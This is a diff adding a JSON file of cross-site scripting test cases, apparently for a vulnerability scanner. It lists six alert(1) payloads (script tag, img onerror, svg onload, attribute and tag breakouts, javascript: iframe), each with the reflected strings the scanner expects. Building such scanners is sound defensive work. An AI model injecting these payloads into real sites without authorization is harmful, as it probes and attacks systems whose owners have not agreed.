@@ -1,0 +1,57 @@
+{
+    "tests": [
+        {
+            "priority": 1,
+            "name": "Básico <script>alert(1)</script>",
+            "payload": "<script>alert(1)</script>",
+            "expect": [
+                "<script>alert(1)</script>"
+            ]
+        },
+        {
+            "priority": 1,
+            "name": "HTML image with onerror",
+            "payload": "<img src=x onerror=alert(1)>",
+            "expect": [
+                "<img src=x onerror=alert(1)>"
+            ]
+        },
+        {
+            "priority": 1,
+            "name": "SVG with onload",
+            "payload": "<svg/onload=alert(1)>",
+            "expect": [
+                "<svg",
+                "onload=",
+                "alert(1)"
+            ]
+        },
+        {
+            "priority": 2,
+            "name": "Atributo con evento JS",
+            "payload": "\" onmouseover=alert(1) x=\"",
+            "expect": [
+                "onmouseover=",
+                "alert(1)"
+            ]
+        },
+        {
+            "priority": 2,
+            "name": "Tag cerrado malicioso",
+            "payload": "'><script>alert(1)</script>",
+            "expect": [
+                "<script>alert(1)</script>",
+                "alert(1)"
+            ]
+        },
+        {
+            "priority": 2,
+            "name": "JS URI en iframe",
+            "payload": "<iframe src=javascript:alert(1)>",
+            "expect": [
+                "<iframe",
+                "javascript:alert(1)"
+            ]
+        }
+    ]
+}
